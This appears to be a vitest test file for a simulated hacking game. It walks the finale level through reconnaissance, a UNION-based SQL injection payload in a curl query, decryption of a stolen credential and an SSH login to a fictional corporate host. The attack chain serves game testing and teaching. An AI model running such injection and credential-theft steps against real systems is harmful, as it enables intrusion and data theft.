import { describe, expect, it } from 'vitest';
import { opensslDecrypt } from '../../src/engine/crypto/openssl';
import { checkFlag } from '../../src/engine/game/flag';
import { isStub, type Level } from '../../src/engine/game/level';
import { base64Decode } from '../../src/engine/util/base64';
import { LEVELS } from '../../src/levels';
import {
  DEPLOY_PASSWORD,
  FLAG as FLAG15,
  VAULT_PASSPHRASE,
} from '../../src/levels/level15/solution';
import { createGame, type GameHarness, storageStartingAt } from '../helpers/game';

async function step(
  h: GameHarness,
  line: string,
  answers: readonly string[] = [],
): Promise<{ stdout: string; stderr: string }> {
  h.take();
  const queue = [...answers];
  await h.game.shell.submit(line);
  while (h.game.shell.inputRequest.kind === 'read') {
    await h.game.shell.submit(queue.shift() ?? '');
    await h.game.shell.whenReady();
  }
  await h.game.shell.whenReady();
  return h.take();
}

async function gameAt(id: string): Promise<GameHarness> {
  const h = await createGame(LEVELS, { storage: await storageStartingAt(LEVELS, id) });
  expect(h.game.level.id).toBe(id);
  return h;
}

const playable = (id: string): Level => {
  const found = LEVELS.find((entry) => entry.id === id);
  if (!found || isStub(found)) throw new Error(`no playable level ${id}`);
  return found;
};

describe('Chapter 5 catalog', () => {
  it('is a single finale level whose flag matches its hash', () => {
    const chapter5 = LEVELS.filter((entry) => entry.chapter === 5);
    expect(chapter5.map((entry) => entry.id)).toEqual(['15-the-last-door']);
    const level = chapter5[0] as Level;
    expect(level.hints.length).toBeGreaterThanOrEqual(3);
    expect(checkFlag(FLAG15, playable('15-the-last-door').flagHash)).toBe('match');
  });
});

describe('Chapter 5 finale', () => {
  it('level 15 chains recon, injection, decryption and ssh', async () => {
    const h = await gameAt('15-the-last-door');

    // 1. recon
    expect((await step(h, 'nmap corp-core.novacorp.internal')).stdout).toContain('80/tcp');
    // 2. robots + injection to read the vault
    expect((await step(h, 'curl http://corp-core.novacorp.internal/robots.txt')).stdout).toContain(
      '/api/search',
    );
    const injected = await step(
      h,
      `curl "http://corp-core.novacorp.internal/api/search?q=' UNION SELECT label, value, note FROM vault -- "`,
    );
    expect(injected.stdout).toContain('deploy.cred.enc');
    expect(injected.stdout).toContain(VAULT_PASSPHRASE);

    // 3. pull the base64 blob out of the response and decrypt it, exactly as the player would
    const blob = injected.stdout
      .split('\n')
      .find((l) => l.startsWith('deploy.cred.enc'))!
      .split('  |  ')[1]!;
    const decoded = base64Decode(blob);
    expect(decoded.ok).toBe(true);
    const cred = opensslDecrypt(decoded.ok ? decoded.bytes : '', VAULT_PASSPHRASE);
    expect(cred.ok && cred.plaintext.trim()).toBe(DEPLOY_PASSWORD);

    // and prove the in-terminal openssl pipeline recovers the same password
    const viaCommand = await step(
      h,
      `echo '${blob}' | openssl enc -d -a -aes-256-cbc -k ${VAULT_PASSPHRASE}`,
    );
    expect(viaCommand.stdout.trim()).toBe(DEPLOY_PASSWORD);

    // 4. ssh in with it and read the flag
    await step(h, 'ssh deploy@corp-core.novacorp.internal', ['yes', DEPLOY_PASSWORD]);
    expect(h.game.shell.session.machine.hostname).toBe('corp-core');
    expect(h.game.shell.session.user.name).toBe('deploy');
    expect((await step(h, 'cat root-access.txt')).stdout).toContain(FLAG15);

    const captured = await step(h, `submit ${FLAG15}`);
    expect(captured.stdout).toContain('Level captured!');
    // Completing the last level finishes the run.
    expect(captured.stdout).toContain('RUN SUMMARY');
    expect(h.game.runSummary().complete).toBe(true);
  });
});
